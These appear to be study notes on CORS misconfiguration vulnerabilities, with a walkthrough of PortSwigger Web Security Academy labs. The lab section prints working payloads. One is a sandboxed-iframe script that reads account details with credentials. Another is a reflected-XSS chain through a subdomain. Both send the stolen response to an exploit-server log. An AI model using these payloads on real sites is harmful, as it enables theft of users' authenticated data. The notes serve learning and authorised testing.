# CORS stands for Cross Origin Resource Sharing
- By default the web protocol is allowed to make request from 1 domain to another domain.
They can't read responses.

## Dynamic WebApps
- Dynamic WebApps need get response from different subdomain or payment gateway , analytics page, APi etc.
In order to read response from different domain the thirdparty domain should have
```bash
Access-Control-Allow-Origin: Webap.com
```
This header in place

- It can also fetch account related informations such as score, balance,privilege but to get access from authenticated page
It should have this header
```bash
Access-Control-Allow-Credentials: True
```

# Rules Of CORS protocol
- There are 3 methods supported by CORS
```bash
Access-Control-Allow-Origin: onlyonedomain.com
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: null
```
- Note if it is set to */wildcard The
```bash
Access-Control-Allow-Credentials: True
```
- It will not work for security reasobs

# Where is the vulnerbility
- Since only single domain is allowd to be in Access-Control-Allow-Origin Header. The modern web app uses dynamic generation of hostnames to put in headers in each request.
- So it uses regex for allowing multiple domains to access resources.

# Bugs to check
- add origin as null
- use suffix or prifix of allowd domain to check
- try other ways to bypass regex

# LAB
### CORS Minconfiguration With No Protection
```bash
/accountDetail gives a json that contains account info
tried Origin: example.com and it worked

Now the javascript for exploit server
```
### CORS vulnerability with trusted null origin
```bash
Added null in input got the header as null

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

### Site trusts all subdomains
```bash
In that case find a reflected XSS
We will request for resource using XSS then force the subdomain to send data to us

in our server 

<script>
    document.location="https://stock.0a3b00eb035dfb9280751cc1000100e2.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a3b00eb035dfb9280751cc1000100e2.web-security-academy.net',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a93007e039dfb4c80861bcc01070025.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>


Now what will happend is we will trigegr xss in subdomain and force it to send data back to us
```

### CORS Regex Bypass
```bash
Allowed : https://example.com
Try: https://evil.example.com
```


### Resources
- [Report 1](https://hackerone.com/reports/426165)
- [Report 2](https://hackerone.com/reports/470298)
- [Writeup](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)
